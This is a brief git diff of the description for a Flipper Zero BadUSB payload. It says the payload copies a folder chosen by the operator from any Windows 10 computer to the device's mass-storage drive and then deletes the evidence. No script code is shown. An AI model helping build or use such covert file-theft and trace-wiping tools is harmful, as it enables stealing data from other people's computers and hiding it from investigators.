@@ -7,9 +7,10 @@ Link: https://github.com/emptythevoid/flipperzero/blob/main/badusb/read-from-fli
 
 Edited To Suit By Skrimbo_Jones
 
- This Program will copy files from the Pictures, Videos, Documents, and Downloads folders on any windows 10 computer
+ This Program will copy a folder of your choice (Edit the $sourceDirectory variable in code to suit) on any windows 10 computer
  
- then copy them to the MAXUS drive opened in the Mass Storage App on your Flipper Zero.
+ then copy it to the MAXUS drive opened in the Mass Storage App on your Flipper Zero and delete the evidence.
  
  NOTE: This could take a long time depending on the files being copied.
  
+~Skrimbo_Jones
